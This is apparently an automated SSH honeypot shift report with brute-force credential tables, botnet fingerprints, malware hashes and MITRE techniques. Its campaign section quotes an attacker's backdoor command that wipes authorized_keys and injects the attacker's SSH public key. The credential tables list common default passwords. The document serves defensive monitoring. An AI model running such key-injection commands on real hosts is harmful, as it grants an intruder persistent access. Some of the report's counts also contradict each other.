# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-19 |
| **Generated At** | 2026-07-19T22:57:19Z |
| **Shift Time** | 22:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **211** |
| Confirmed Threats | **0** |
| False Positives Filtered | **211** (100.0%) |
| Unique Attacker IPs | **141** |
| Countries of Origin | **0** |
| High Severity Cases | **114** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **97** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **180** |
| Unique Credential Pairs | **59** |
| Unique Usernames | **20** |
| Unique Passwords | **56** |
| Successful Auth Pairs | **131** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `admin` | 46 |
| `root` | 36 |
| `support` | 20 |
| `unknown` | 15 |
| `centos` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 14 |
| `` | 8 |
| `support` | 7 |
| `passw0rd` | 6 |
| `password` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 14 |
| `admin` | `` | 8 |
| `support` | `support` | 7 |
| `support` | `password` | 6 |
| `admin` | `admin2005` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `47.251.172.85` | 2026-07-19T18:57:59 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-19T18:57:59 |
| `ubuntu` | `pa$$w0rd` | `10.0.0.73` | 2026-07-19T18:58:39 |
| `ubuntu` | `pa$$w0rd` | `185.242.3.195` | 2026-07-19T19:00:01 |
| `admin` | `1qazxsw2` | `117.247.239.202` | 2026-07-19T19:03:49 |
| `admin` | `1qazxsw2` | `14.33.93.214` | 2026-07-19T19:03:58 |
| `ubnt` | `112233` | `200.232.114.71` | 2026-07-19T19:05:10 |
| `admin` | `1qazxsw2` | `24.47.192.100` | 2026-07-19T19:07:15 |
| `admin` | `1qazxsw2` | `200.164.149.58` | 2026-07-19T19:07:23 |
| `ubuntu` | `ubuntu1234567` | `185.242.3.195` | 2026-07-19T19:07:30 |
| `ubnt` | `112233` | `175.206.1.60` | 2026-07-19T19:08:30 |
| `support` | `support` | `176.53.159.196` | 2026-07-19T19:08:36 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-19T19:12:51 |
| `nobody` | `1qaz2wsx` | `117.158.166.73` | 2026-07-19T19:14:28 |
| `nobody` | `1qaz2wsx` | `203.75.170.63` | 2026-07-19T19:14:41 |
| `admin` | `admin2005` | `117.222.2.165` | 2026-07-19T19:14:52 |
| `nobody` | `1qaz2wsx` | `10.0.0.73` | 2026-07-19T19:14:56 |
| `admin` | `admin2005` | `202.111.183.30` | 2026-07-19T19:15:03 |
| `root` | `﻿------fuck------` | `117.33.242.50` | 2026-07-19T19:18:13 |
| `admin` | `admin2005` | `103.83.23.169` | 2026-07-19T19:18:17 |
| `admin` | `admin2005` | `10.0.0.73` | 2026-07-19T19:18:40 |
| `admin` | `admin` | `185.70.109.79` | 2026-07-19T19:22:01 |
| `root` | `!QAZ2wsx` | `121.202.198.98` | 2026-07-19T19:29:52 |
| `root` | `1qaz@WSX` | `49.124.142.132` | 2026-07-19T19:32:06 |
| `root` | `1qaz@WSX` | `196.188.93.169` | 2026-07-19T19:32:18 |
| `root` | `!QAZ2wsx` | `175.206.1.60` | 2026-07-19T19:33:15 |
| `root` | `!QAZ2wsx` | `222.190.110.210` | 2026-07-19T19:33:24 |
| `root` | `!QAZ2wsx` | `10.0.0.73` | 2026-07-19T19:33:38 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-19T19:34:42 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-19T19:34:42 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-19T19:34:45 |
| `centos` | `passw0rd` | `62.220.104.155` | 2026-07-19T19:35:53 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-19T19:36:24 |
| `unknown` | `unknown2005` | `182.76.36.62` | 2026-07-19T19:38:38 |
| `unknown` | `unknown2005` | `118.163.145.175` | 2026-07-19T19:38:52 |
| `centos` | `passw0rd` | `119.92.76.210` | 2026-07-19T19:39:16 |
| `centos` | `passw0rd` | `58.22.255.28` | 2026-07-19T19:39:25 |
| `centos` | `passw0rd` | `10.0.0.73` | 2026-07-19T19:39:40 |
| `unknown` | `unknown2005` | `197.242.170.10` | 2026-07-19T19:41:54 |
| `ubuntu` | `ubuntu1234567` | `10.0.0.73` | 2026-07-19T19:51:27 |
| `debian` | `123abc` | `103.68.52.210` | 2026-07-19T19:53:46 |
| `admini` | `admini` | `20.172.240.136` | 2026-07-19T19:56:31 |
| `345gs5662d34` | `345gs5662d34` | `20.172.240.136` | 2026-07-19T19:56:32 |
| `admini` | `3245gs5662d34` | `20.172.240.136` | 2026-07-19T19:56:32 |
| `blank` | `passw0rd` | `10.0.0.73` | 2026-07-19T19:58:17 |
| `support` | `support` | `10.0.0.73` | 2026-07-19T19:59:33 |
| `root` | `Password12345` | `185.242.3.195` | 2026-07-19T20:00:16 |
| `nobody` | `raspberry` | `177.159.150.111` | 2026-07-19T20:02:09 |
| `nobody` | `raspberry` | `180.248.52.247` | 2026-07-19T20:02:19 |
| `centos` | `alpine` | `10.0.0.73` | 2026-07-19T20:04:25 |
| `nobody` | `raspberry` | `196.188.93.169` | 2026-07-19T20:05:11 |
| `nobody` | `raspberry` | `27.128.162.146` | 2026-07-19T20:05:19 |
| `admin` | `admin` | `45.43.37.254` | 2026-07-19T20:12:43 |
| `root` | `qwe123!@#` | `217.150.37.249` | 2026-07-19T20:18:34 |
| `root` | `qwe123!@#` | `112.6.11.184` | 2026-07-19T20:18:43 |
| `root` | `qwe123!@#` | `10.0.0.73` | 2026-07-19T20:22:20 |
| `user1` | `user1` | `10.0.0.73` | 2026-07-19T20:23:01 |
| `support` | `administrator` | `111.198.53.188` | 2026-07-19T20:25:22 |
| `support` | `administrator` | `219.248.65.30` | 2026-07-19T20:25:35 |
| `user` | `user2016` | `220.178.39.106` | 2026-07-19T20:26:26 |
| `user` | `user2016` | `218.200.9.182` | 2026-07-19T20:26:39 |
| `support` | `administrator` | `41.220.3.101` | 2026-07-19T20:28:48 |
| `support` | `administrator` | `10.0.0.73` | 2026-07-19T20:29:16 |
| `user` | `user2016` | `10.0.0.73` | 2026-07-19T20:30:03 |
| `caja01` | `caja01` | `185.100.84.174` | 2026-07-19T20:32:52 |
| `support` | `123123123` | `200.232.114.71` | 2026-07-19T20:43:24 |
| `support` | `123123123` | `114.30.180.58` | 2026-07-19T20:43:32 |
| `root` | `Password12345` | `10.0.0.73` | 2026-07-19T20:43:47 |
| `support` | `123123123` | `218.248.19.102` | 2026-07-19T20:47:01 |
| `user` | `user123` | `10.0.0.73` | 2026-07-19T20:47:41 |
| `unknown` | `admin123` | `221.120.57.125` | 2026-07-19T20:49:58 |
| `unknown` | `admin123` | `220.122.115.9` | 2026-07-19T20:50:11 |
| `admin` | `Admin@9000` | `185.242.3.195` | 2026-07-19T20:52:27 |
| `unknown` | `admin123` | `31.173.29.136` | 2026-07-19T20:52:54 |
| `debian` | `techsupport` | `10.0.0.73` | 2026-07-19T20:53:45 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-19T20:57:50 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-19T20:57:53 |
| `admin` | `admin333` | `182.151.45.136` | 2026-07-19T21:08:44 |
| `admin` | `admin333` | `222.120.176.6` | 2026-07-19T21:08:53 |
| `vodafone` | `vodafone` | `10.0.0.73` | 2026-07-19T21:12:05 |
| `admin` | `admin333` | `14.29.204.161` | 2026-07-19T21:12:07 |
| `root` | `﻿------fuck------` | `23.95.220.221` | 2026-07-19T21:16:36 |
| `test` | `test2021` | `10.0.0.73` | 2026-07-19T21:17:51 |
| `centos` | `123abc` | `1.247.245.61` | 2026-07-19T21:18:16 |
| `centos` | `123abc` | `10.0.0.73` | 2026-07-19T21:18:33 |
| `admin` | `admin` | `8.208.44.152` | 2026-07-19T21:23:56 |
| `admin` | `Admin@9000` | `10.0.0.73` | 2026-07-19T21:35:40 |
| `test` | `qwerty1` | `207.254.22.207` | 2026-07-19T21:36:38 |
| `test` | `qwerty1` | `10.0.0.73` | 2026-07-19T21:37:05 |
| `support` | `password` | `31.173.0.46` | 2026-07-19T21:39:29 |
| `support` | `password` | `111.53.131.79` | 2026-07-19T21:39:37 |
| `test` | `test2004` | `68.7.114.69` | 2026-07-19T21:40:42 |
| `test` | `test2004` | `10.0.0.73` | 2026-07-19T21:41:03 |
| `support` | `password` | `103.171.39.147` | 2026-07-19T21:42:42 |
| `support` | `password` | `66.45.144.201` | 2026-07-19T21:42:53 |
| `support` | `password` | `10.0.0.73` | 2026-07-19T21:43:10 |
| `root` | `QWEasd@123` | `185.242.3.195` | 2026-07-19T21:44:16 |
| `admin` | `superuser` | `203.198.173.145` | 2026-07-19T21:57:45 |
| `admin` | `1qaz@wsx` | `82.193.122.91` | 2026-07-19T21:57:48 |
| `admin` | `superuser` | `117.2.123.19` | 2026-07-19T21:57:54 |
| `admin` | `1qaz@wsx` | `222.76.248.54` | 2026-07-19T21:57:56 |
| `unknown` | `unknown2015` | `123.129.245.249` | 2026-07-19T22:00:47 |
| `unknown` | `unknown2015` | `61.12.84.172` | 2026-07-19T22:00:56 |
| `admin` | `1qaz@wsx` | `76.133.97.153` | 2026-07-19T22:01:07 |
| `admin` | `superuser` | `10.0.0.73` | 2026-07-19T22:01:37 |
| `admin` | `1qaz@wsx` | `10.0.0.73` | 2026-07-19T22:01:42 |
| `unknown` | `unknown2015` | `10.0.0.73` | 2026-07-19T22:04:07 |
| `blank` | `123654` | `87.103.126.54` | 2026-07-19T22:04:08 |
| `ubnt` | `Password` | `218.29.196.162` | 2026-07-19T22:22:27 |
| `operator` | `operator12345` | `187.115.144.103` | 2026-07-19T22:24:24 |
| `root` | `QWEasd@123` | `10.0.0.73` | 2026-07-19T22:27:01 |
| `root` | `TCL4HEX1gQ` | `139.196.233.223` | 2026-07-19T22:27:23 |
| `blank` | `maintenance` | `211.22.222.251` | 2026-07-19T22:28:43 |
| `blank` | `maintenance` | `10.0.0.73` | 2026-07-19T22:32:21 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-19T22:34:27 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-19T22:34:27 |
| `joan` | `123@joan` | `185.242.3.195` | 2026-07-19T22:35:31 |
| `admin` | `admin` | `8.213.151.148` | 2026-07-19T22:39:38 |
| `centos` | `12345678` | `62.182.132.94` | 2026-07-19T22:46:59 |
| `root` | `4` | `177.174.0.3` | 2026-07-19T22:47:02 |
| `centos` | `12345678` | `90.230.168.26` | 2026-07-19T22:47:05 |
| `root` | `Aa@123456` | `10.0.0.73` | 2026-07-19T22:47:09 |
| `root` | `4` | `186.239.41.74` | 2026-07-19T22:47:12 |
| `unknown` | `unknown2002` | `211.193.249.210` | 2026-07-19T22:47:25 |
| `unknown` | `unknown2002` | `95.79.57.221` | 2026-07-19T22:47:37 |
| `telegram` | `1234` | `189.240.44.9` | 2026-07-19T22:49:40 |
| `345gs5662d34` | `345gs5662d34` | `189.240.44.9` | 2026-07-19T22:49:42 |
| `telegram` | `3245gs5662d34` | `189.240.44.9` | 2026-07-19T22:49:43 |
| `centos` | `12345678` | `10.0.0.73` | 2026-07-19T22:50:36 |
| `unknown` | `unknown2002` | `188.43.204.45` | 2026-07-19T22:50:38 |
| `unknown` | `unknown2002` | `10.0.0.73` | 2026-07-19T22:50:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **211** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 72 |
| Go SSH scanner | 29 |
| libssh | 22 |
| Paramiko (Python) | 12 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 72 | 69 |
| `16443846184e...` | Generic scanner | 12 | 3 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `19532158b559...` | Mirai/variant | 5 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 72 | 69 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 12 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 5 | 5 | Mirai/variant |
| `5f904648ee89...` | Go SSH scanner | 5 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.172.240.136`, `189.240.44.9`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **141** |
| Unique ASNs | **85** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 10 | LOW |
| `AS4134` | CHINANET BACKBONE | 7 | LOW |
| `AS22773` | Cox Communications Inc. | 7 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | LOW |
| `AS4766` | Korea Telecom | 5 | LOW |
| `AS396982` | Google LLC | 4 | LOW |
| `AS9829` | National Internet Backbone | 4 | LOW |
| `AS3301` | Telia Company AB | 3 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **22/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 140 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 114 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (211 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 211 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 211 cases |
| Tool 34  | Credential Extractor        | ✅ 180 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 141 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 211 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 85 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
